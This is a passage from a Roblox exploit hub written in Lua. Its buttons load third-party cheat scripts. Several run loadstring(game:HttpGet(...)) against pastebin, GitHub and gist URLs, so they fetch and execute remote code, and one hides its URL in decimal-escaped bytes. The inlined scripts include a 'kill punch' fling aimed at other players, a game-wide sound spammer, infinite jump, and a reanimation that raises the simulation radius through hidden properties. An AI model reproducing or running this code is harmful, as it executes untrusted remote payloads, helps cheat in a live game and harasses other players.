LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
end
srv.RenderStepped:Wait()
end
end)()
end)

Section:NewButton("Bed wars script jnhh gaming Hub v7", "Made by jnhh gaming", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming123/JN-Bedwars-V7/main/JN%20Bedwars%20V7",true))()
end)
Section:NewButton("Zepssy Gui (Prison Life script)", "Okeh", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)
Section:NewButton("Ninja Tycoon Script", "Credit to owner", function()
    repeat task.wait()until game:IsLoaded()if not IrisNotificationMrJack then loadstring(game:HttpGet"https://raw.githubusercontent.com/thedragonslayer2/hey/main/Misc./iris%20notification%20function")()elseif IrisNotificationUserMrJack then IrisNotificationUserMrJack.ClearAllNotifications()end;IrisNotificationMrJack(1,"Key System","Executed! Please wait...",9e9)task.wait(0.4)getgenv().gameslink="https://raw.githubusercontent.com/thedragonslayer2/Supported-Games/main/Mr%20Jack"loadstring(game:HttpGet"https://raw.githubusercontent.com/thedragonslayer2/Key-System/main/Load.lua")()
end)
Window1Section:NewButton("Fe Punch Fling✊ (READ INFO)", "To punch press F and some things is Z and X", function()
    --Discord:gabkiu#9778 / Harpax#9861
    
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
    
-- V2 FE KILL Punch Made by gabkiu Discord:gabkiu#9778, updated with the UI lib that I made.
local Classes = loadstring(game:HttpGet('https://pastebin.com/raw/2muvijsJ',true))()

local Tab = Classes.Tab(game.CoreGui)

local Enabled_Box = Classes.Checkbox(Tab,true)
local Anim_Box = Classes.Checkbox(Tab,true)
local Kill_Box  = Classes.Checkbox(Tab,true)
local Power_Label = Classes.Label(Tab)
local Power_Slider = Classes.Slider(Tab)
local Punch_Text = Classes.TextBox(Tab)

local Keys = {
	Punch = "f",
	Previous_Mode = "z",
	Next_Mode = "x",
}

Tab.Titulo.Text = "Punch UI v2"

Enabled_Box.Titulo.Text = "Punch Enabled"
Anim_Box.Titulo.Text = "Animations"
Kill_Box.Titulo.Text = "Kill Cam"

Power_Slider:SetarMaximo(50000)
Power_Slider:SetarIntervalo(10)
Power_Slider:SetarPadrao(30000)

Punch_Text.Titulo.Text = "Punch Key"
Punch_Text.Box.Text = Keys.Punch
Punch_Text.Mudou = function(Valor)
    Punch_Key = Valor
end
Power_Slider.Mudou = function(Valor)
	local Txt = "Power: " .. Valor
	if Valor >= 49000 then
		Txt = "Power: INF"
	end
	Power_Label.Text = Txt
end
Power_Label.Text = "Power: " .. 25000
Punch_Text.Box:GetPropertyChangedSignal("Text"):Connect(function()
    wait()
    local txt = Punch_Text.Box.Text
    if txt:len() > 1 then
        Punch_Text.Box.Text = txt:sub(2,2)
    end
   Keys.Punch = Punch_Text.Box.Text:lower()
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
local StarterGui = game:GetService("StarterGui")
local Character = Player.Character or workspace:WaitForChild(Player.Name)
local CAM = false
local GuiHidden = false
local PunchingEnabled = true
local AnimationsId = {
	R6 = "rbxassetid://204062532",
	R15 = "rbxassetid://846744780"
}
local function NewAnimation(ID)
	local Animation = Instance.new("Animation")
	Animation.AnimationId = ID
	return Animation
end
local R15Animation = NewAnimation(AnimationsId.R15)
local R6Animation = NewAnimation(AnimationsId.R6)

local function GetAnimation(Humanoid)
	if Humanoid.RigType == Enum.HumanoidRigType.R15 then
		return Humanoid:LoadAnimation(R15Animation)
	else
		return Humanoid:LoadAnimation(R6Animation)
	end
end
local keysf = {
	"Push","Fling","Kill","Void"
}
local function UpdateText()
	MLabel.Text = keysf[Current_Mode]
end
local CamIN = false
local function DoCam(Part)
	CamIN = true
	local Camera = workspace.CurrentCamera
	Camera.CameraSubject = Part
	wait(1.85)
	Camera.CameraSubject = Player.Character:FindFirstChild("Head")
	CamIN = false
end
local Punching = false
local function Punch()
    if not Enabled_Box.Estado then
        return
    end
    if Punching then
        return  
    end
	Punching = true
	local Humanoid = Character.Humanoid
	local RootPart = Character.PrimaryPart
    Humanoid:UnequipTools()
    Player.Character.Humanoid:ChangeState(11)
    wait()
	local Tool = Player.Backpack:FindFirstChildOfClass("Tool")
    if Tool == nil then   
        local Args = {
            Title = "PUNCH SCRIPT",
            Text = "ERROR, You need a tool.",
            Icon = "http://www.roblox.com/asset/?id=41363725",
            Duration = 7,
        }
        StarterGui:SetCore("SendNotification",Args)
        return
    end
	local AnimationId
	local AnimationTrack = GetAnimation(Humanoid)
	if Anim_Box.Estado then
		AnimationTrack:Play()
    end           
    wait()
    Player.Character.Humanoid:ChangeState(11)
	local OriginalGrip = Tool.GripPos
	Tool.Parent = Player.Character
    local Power = Power_Slider.Valor
    local PowerY = Power/2
    if Power == 50000 then
        Power = math.huge
        PowerY = math.huge
    end		
	Tool.GripPos = Vector3.new(Power,PowerY,Power)
	wait(0.35)

	Tool.GripPos = OriginalGrip	
	game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
	wait()
	Punching = false
end
local function Next_Mode()
	local Next = Current_Mode + 1
	if Next > #Power_Modes then
		Current_Mode = 1
	else
		Current_Mode = Next
	end
	UpdateText()
end
local DownKeys = {}
local function KeyDown(Key)
	if Key == Keys.Punch then
		Punch()
	end
end
Mouse.KeyDown:Connect(KeyDown)
local function hand(what)
	if game:GetService("Players"):GetPlayerFromCharacter(what.Parent) then
			if Kill_Box.Estado and Punching and not CamIN then
				DoCam(what.Parent:FindFirstChild("Head") or what)
			end
	end
end
Player.CharacterAdded:Connect(function()
	Character = Player.Character
	wait(1)
	local Hand = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm")
	if Hand then
		Hand.Touched:Connect(hand)
	end
end)
wait()
local Hand = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm")
if Hand then
	Hand.Touched:Connect(hand)
end
game:GetService("RunService").RenderStepped:Connect(function()
    if Punching then
        Player.Character.Humanoid:ChangeState(11)
    end
end)
game:GetService("StarterGui"):SetCore("SendNotification",{Title = "SCRIPT",Text = "By gabkiu (gabkiu#9778/Harpax#9861) press J to hide!",Duration = 15})
Character.Animate.toolnone.ToolNoneAnim.AnimationId = "000000"
end)

Section:NewButton("Apeirophobia script corrupt hub ", "Corrupt hub", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/0ptVa7Dn'))()
end)
Section:NewButton("Inf Jump", "Idk", function()
    local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)()
end)

Section:NewButton("Dark Ghost Hub (READ INFO)", "password is GhostPlayer", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\117\118\112\49\100\119\78\39\41\41\40\41\10")()
end)
Section:NewButton("Fe Audio Spammer (READ INFO)", "Works only CHAOS and natural disaster and some games", function()
    --[[
Made By Scripty#2063
If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
This Gui is Undetectable
RespectFilteringEnabled must be false to use it
--]]

local ScreenGui = Instance.new("ScreenGui")
local Draggable = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Time = Instance.new("TextLabel")
local _1E = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local _3E = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local SE = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Path = Instance.new("TextLabel")
local Top = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Minizum = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local IY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local Wait = Instance.new("TextBox")

--Properties:

ScreenGui.Name = ". Ç¤Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì¡Ò‰Ì¡Ò‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Í¤Ò‰Í¬Ò‰Ì…Ò‰Í¤Ò‰Í¬"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Draggable.Name = "Ç¤Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì¡Ò‰Ì¡Ò‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Í¤Ò‰Í¬Ò‰Ì…Ò‰Í¤Ò‰Í¬."
Draggable.Parent = ScreenGui
Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Draggable.BackgroundTransparency = 1.000
Draggable.BorderSizePixel = 0
Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
Draggable.Size = UDim2.new(0, 438, 0, 277)

Frame.Name = ". . Ç¤Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì¡Ò‰Ì¡Ò‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Í¤Ò‰Í¬Ò‰Ì…Ò‰Í¤Ò‰Í¬. "
Frame.Parent = Draggable
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)

Frame_2.Name = " . Ç¤Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì¡Ò‰Ì¡Ò‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Í¤Ò‰Í¬Ò‰Ì…Ò‰Í¤Ò‰Í¬. "
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
Frame_2.Size = UDim2.new(0, 438, 0, 238)
Frame_2.Active = true
Frame_2.Draggable = true

Time.Name = "Time"
Time.Parent = Frame_2
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1.000
Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
Time.Size = UDim2.new(0, 437, 0, 31)
Time.Font = Enum.Font.GothamSemibold
Time.Text = "RespectFilteringEnabled(RFE) : nil"
Time.TextColor3 = Color3.fromRGB(255, 255, 255)
Time.TextScaled = true
Time.TextSize = 14.000
Time.TextWrapped = true

_1E.Name = "1E"
_1E.Parent = Frame_2
_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_1E.BorderSizePixel = 0
_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
_1E.Size = UDim2.new(0, 208, 0, 33)
_1E.Font = Enum.Font.SourceSans
_1E.Text = "Mute Game"
_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
_1E.TextScaled = true
_1E.TextSize = 30.000
_1E.TextWrapped = true

UICorner.Parent = _1E

_3E.Name = "3E"
_3E.Parent = Frame_2
_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_3E.BorderSizePixel = 0
_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
_3E.Size = UDim2.new(0, 209, 0, 33)
_3E.Font = Enum.Font.SourceSans
_3E.Text = "Annoying  Sound"
_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
_3E.TextSize = 30.000
_3E.TextWrapped = true

UICorner_2.Parent = _3E

SE.Name = "SE"
SE.Parent = Frame_2
SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SE.BorderSizePixel = 0
SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
SE.Size = UDim2.new(0, 209, 0, 33)
SE.Font = Enum.Font.SourceSans
SE.Text = "Kill Sound Service"
SE.TextColor3 = Color3.fromRGB(255, 255, 255)
SE.TextSize = 30.000
SE.TextWrapped = true

UICorner_3.Parent = SE

Path.Name = "Path"
Path.Parent = Frame_2
Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Path.BackgroundTransparency = 1.000
Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
Path.Size = UDim2.new(0, 435, 0, 44)
Path.Font = Enum.Font.GothamSemibold
Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
Path.TextColor3 = Color3.fromRGB(255, 0, 0)
Path.TextScaled = true
Path.TextSize = 14.000
Path.TextWrapped = true

Top.Name = "Top"
Top.Parent = Frame_2
Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top.BorderSizePixel = 0
Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
Top.Size = UDim2.new(0, 438, 0, 30)
Top_2.Name = "Top"
Top_2.Parent = Top
Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top_2.BorderSizePixel = 0
Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
Top_2.Size = UDim2.new(0, 438, 0, 5)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 397, 0, 30)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "FEAG"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
Exit.Size = UDim2.new(0, 32, 0, 25)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "x"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Minizum.Name = "Minizum"
Minizum.Parent = Top
Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minizum.BackgroundTransparency = 1.000
Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
Minizum.Size = UDim2.new(0, 32, 0, 23)
Minizum.Font = Enum.Font.GothamSemibold
Minizum.Text = "_"
Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minizum.TextScaled = true
Minizum.TextSize = 14.000
Minizum.TextWrapped = true

Stop.Name = "Stop"
Stop.Parent = Frame_2
Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
Stop.Size = UDim2.new(0, 424, 0, 33)
Stop.Font = Enum.Font.SourceSans
Stop.Text = "Stop"
Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
Stop.TextSize = 30.000
Stop.TextWrapped = true

UICorner_4.Parent = Stop

IY.Name = "IY"
IY.Parent = Frame_2
IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
IY.Size = UDim2.new(0, 209, 0, 33)
IY.Font = Enum.Font.SourceSans
IY.Text = "Unmute Game"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 30.000
IY.TextWrapped = true

UICorner_5.Parent = IY

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Wait Speed       :"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Wait.Name = "Wait()"
Wait.Parent = Frame_2
Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Wait.BackgroundTransparency = 1.000
Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
Wait.Size = UDim2.new(0, 199, 0, 50)
Wait.ZIndex = 99999
Wait.ClearTextOnFocus = false
Wait.Font = Enum.Font.GothamSemibold
Wait.Text = "0.5"
Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
Wait.TextSize = 30.000
Wait.TextWrapped = true

--Sound Service:
local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 5
notification.Name = ". Ç¤Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì·Ò‰ÌµÒ‰Ì¸Ò‰Ì¡Ò‰Ì¡Ò‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Ì¼Ò‰Ì±Ò‰ÍŽÒ‰ÍŽÒ‰ÌžÒ‰Í¤Ò‰Í¬Ò‰Ì…Ò‰Í¤Ò‰Í¬"

--funuction:
Exit.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)
local Mute = false
IY.MouseButton1Click:Connect(function()
	Mute = false
end)

_1E.MouseButton1Click:Connect(function()
	Mute = true
	while Mute == true do 
		wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

_3E.MouseButton1Click:Connect(function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
end)

local Active = true
SE.MouseButton1Click:Connect(function()
	Active = true
	while Active == true do
		local StringValue = Wait.Text
		wait(StringValue)
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		end
	end
end)

Stop.MouseButton1Click:Connect(function()
	Active = false
end)
--Credit:
notification:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "FEAG";
	Text = "FEAG Has Been Loaded , Made By Scripty#2063 (gamer14_123)";
	Icon = "";
	Duration = 10; 
	Button1 = "Yes Sir";
})
--Check:
while true do
	wait(0.5)
	local setting = game:GetService("SoundService").RespectFilteringEnabled
	if setting == true then
		Time.TextColor = BrickColor.new(255,0,0)
		Time.Text ="RespectFilteringEnabled(RFE) : true"
	elseif setting == false then
		Time.Text ="RespectFilteringEnabled(RFE) : false"
		Time.TextColor = BrickColor.new(0,255,0)
	end
end
end)

LocalSection:NewButton("Kick Yourself", "Kick yourself fe", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/testttbqwebg/adc0db730f5dfca0d8dbdb81f3b65391/raw/b0443888c4399af5a297cb1100a4749c65705711/qweqw", true))()
end)
Window1Section:NewButton("Winged Master Fe no hat's needed", "Dark eccentric", function()
    
--MADE BY DELECTIV/GUAVAJUICEFANCLUBFAN
--SUBSCRIBE TO DARK ECCENTRIC
function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
